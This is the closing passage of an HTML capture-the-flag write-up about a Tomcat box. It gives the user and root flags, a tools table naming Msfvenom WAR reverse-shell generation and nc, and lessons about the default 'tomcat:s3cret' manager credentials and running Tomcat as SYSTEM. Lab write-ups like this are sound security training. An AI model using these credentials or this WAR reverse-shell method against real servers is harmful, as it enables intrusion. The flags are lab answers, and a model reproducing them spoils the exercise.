src="flags.png"/></a></figure></div><div style="display:contents" dir="auto"><h3 id="c21a8164-617e-82f9-9f86-01bc06508537" class="">User Flag</h3></div><div style="display:contents" dir="auto"><p id="978a8164-617e-82b6-af3d-81a023766bb0" class=""><strong>Flag: </strong><code><strong>7004dbcef0f854e0fb401875f26ebd00</strong></code></p></div><div style="display:contents" dir="auto"><h3 id="a26a8164-617e-827e-b8cd-81c9263d93a5" class="">Root Flag</h3></div><div style="display:contents" dir="auto"><p id="4c1a8164-617e-83af-9209-0129cd16c99a" class=""><strong>Flag: </strong><code><strong>04a8b36e1545a455393d067e772fe90e</strong></code></p></div><div style="display:contents" dir="auto"><h2 id="f77a8164-617e-834f-89a5-015f8bad3c03" class="">Privilege Escalation</h2></div><div style="display:contents" dir="auto"><p id="363a8164-617e-802a-853e-eace202e5a76" class="">Tomcat  is running with  <code>NT AUTHORITY\SYSTEM </code>  and reverse shell is already <code>SYSTEM</code>.</p></div><div style="display:contents" dir="auto"><h2 id="362a8164-617e-8056-8a84-efa01b51fd5e" class="">Tools Used</h2></div><div style="display:contents" dir="ltr"><table id="ab3a8164-617e-8360-b637-811e6db35d16" class="simple-table"><thead class="simple-table-header"><div style="display:contents" dir="ltr"><tr id="e25a8164-617e-838e-973c-813761e41c70"><th id="Fy@=" class="simple-table-header-color simple-table-header">Tool</th><th id="k\xe" class="simple-table-header-color simple-table-header">Purpose</th></tr></div></thead><tbody><div style="display:contents" dir="ltr"><tr id="f3fa8164-617e-824c-a49c-0147671d78d6"><td id="Fy@=" class="">Nmap</td><td id="k\xe" class="">Port scanning</td></tr></div><div style="display:contents" dir="ltr"><tr id="665a8164-617e-8220-a8dd-8135714bccbb"><td id="Fy@=" class="">Whatweb</td><td id="k\xe" class="">Web technology fingerprinting</td></tr></div><div style="display:contents" dir="ltr"><tr id="362a8164-617e-800c-9189-ca97c6a50a1d"><td id="Fy@=" class="">Msfvenom</td><td id="k\xe" class="">Generate WAR reverse shell payload</td></tr></div><div style="display:contents" dir="ltr"><tr id="362a8164-617e-8006-b29f-e25721d78711"><td id="Fy@=" class="">nc</td><td id="k\xe" class="">Catch reverse shell</td></tr></div></tbody></table></div><div style="display:contents" dir="auto"><h2 id="557a8164-617e-8358-b5a4-81a42075774f" class="">Lessons Learned</h2></div><div style="display:contents" dir="auto"><ol type="1" id="aa5a8164-617e-823f-86a6-0156e8590994" class="numbered-list" start="1"><li><strong>Default credentials are a critical risk, </strong><code>tomcat:s3cret</code> grants full manager access.</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="be1a8164-617e-837d-8df9-814096877894" class="numbered-list" start="2"><li><strong>Tomcat service accounts</strong> should never run as SYSTEM. Always run as a low-privileged user.</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="528a8164-617e-826d-9a22-01b1c13f29b1" class="numbered-list" start="3"><li><strong>WAR deployment</strong> is an easy RCE vector if the manager interface is exposed and poorly configured.</li></ol></div><div style="display:contents" dir="auto"><h2 id="f3ba8164-617e-836b-a603-01e23767ac1f" class="">References</h2></div><div style="display:contents" dir="auto"><ul id="1b2a8164-617e-837c-aedb-813bdd7a4845" class="bulleted-list"><li style="list-style-type:disc"><strong>Tomcat Manager App Guide</strong> - Official guide to the HTML interface<br/></li></ul></div><div style="display:contents" dir="auto"><hr id="72da8164-617e-836b-bd5d-81ebc8161f85"/></div><div style="display:contents" dir="auto"><p id="85da8164-617e-830e-82ff-016abb1725f0" class=""><strong>Completed on: 12 May 2026</strong> | <strong>Time spent:</strong> 20 minutes</p></div><div style="display:contents" dir="auto"><p id="362a8164-617e-8007-8448-cb43eba6eb4b" class="">
+</p></div><div style="display:contents" dir="auto"><p id="840a8164-617e-829b-b201-811b21524392" class=""><strong>Final thoughts: </strong><em>The simplest vulnerabilities are often the most dangerous, not because they&#x27;re hard to find, but because they&#x27;re so easily overlooked.</em></p></div><div style="display:contents" dir="auto"><p id="362a8164-617e-8058-9ec5-e41f0ad7ad2d" class="">
+</p></div></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
